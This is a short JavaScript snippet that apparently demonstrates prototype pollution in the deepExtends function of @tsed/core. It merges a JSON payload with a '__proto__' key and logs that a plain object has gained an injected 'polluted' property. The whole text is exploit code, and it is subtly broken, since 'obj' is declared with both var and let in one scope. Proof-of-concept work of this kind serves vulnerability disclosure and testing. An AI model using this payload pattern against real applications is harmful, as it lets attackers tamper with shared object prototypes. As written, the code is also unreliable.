var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const {deepExtends} = require('@tsed/core');
const payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');
let obj = {};
console.log({}.polluted);
let result = deepExtends({ security: [{ 1: 'o' }] }, payload);
console.log({}.polluted);